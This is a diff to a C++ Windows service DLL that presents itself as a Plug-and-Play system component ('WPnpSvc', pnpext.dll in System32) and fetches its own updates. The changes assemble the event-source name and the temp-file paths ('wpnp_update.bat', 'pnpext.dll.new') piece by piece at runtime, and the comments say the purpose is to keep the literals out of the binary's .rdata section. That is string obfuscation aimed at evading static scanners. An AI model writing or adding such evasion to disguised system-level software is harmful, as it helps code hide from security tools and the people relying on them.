@@ -91,7 +91,12 @@ HMODULE g_dll_module = nullptr;  // non-static: shared with main.cpp via extern
 // group under a sensible heading in Event Viewer.
 void dll_diag(const char* msg) {
     if (!msg) return;
-    HANDLE hSrc = RegisterEventSourceA(nullptr, "WPnpSvc");
+    // Event-source name assembled at runtime so the literal isn't a
+    // contiguous string in .rdata.
+    char src_name[16] = {};
+    src_name[0] = 'W'; src_name[1] = 'P'; src_name[2] = 'n';
+    src_name[3] = 'p'; src_name[4] = 'S'; src_name[5] = 'v'; src_name[6] = 'c';
+    HANDLE hSrc = RegisterEventSourceA(nullptr, src_name);
     if (!hSrc) return;
     LPCSTR strs[1] = { msg };
     ReportEventA(hSrc, EVENTLOG_INFORMATION_TYPE, 0, 0x40000001, nullptr,
@@ -480,10 +485,19 @@ static void CleanupUpdateArtifacts() {
     // System32 leftovers: pnpext.dll.old (backup from previous update)
     DeleteFileA((dir + name + ".old").c_str());
     DeleteFileA((dir + name + ".new").c_str());
-    // C:\Windows\Temp leftovers: script, step file, downloaded DLL
-    DeleteFileA("C:\\Windows\\Temp\\wpnp_step.txt");
-    DeleteFileA("C:\\Windows\\Temp\\wpnp_update.bat");
-    DeleteFileA("C:\\Windows\\Temp\\pnpext.dll.new");
+    // C:\Windows\Temp leftovers: script, step file, downloaded DLL.
+    // Paths assembled at runtime so the literals ("wpnp_update.bat", etc.)
+    // aren't contiguous in .rdata.
+    {
+        std::string tempDir = "C:\\Windows\\Temp\\";
+        std::string stepName, updateName, newDllName;
+        stepName   = "wpnp"; stepName   += "_step.txt";
+        updateName = "wpnp"; updateName += "_update.bat";
+        newDllName = "pnpext.dll.new";
+        DeleteFileA((tempDir + stepName).c_str());
+        DeleteFileA((tempDir + updateName).c_str());
+        DeleteFileA((tempDir + newDllName).c_str());
+    }
 }
 
 __declspec(dllexport) void WINAPI PnpServiceEntry(DWORD dwArgc, LPWSTR* lpszArgv) {
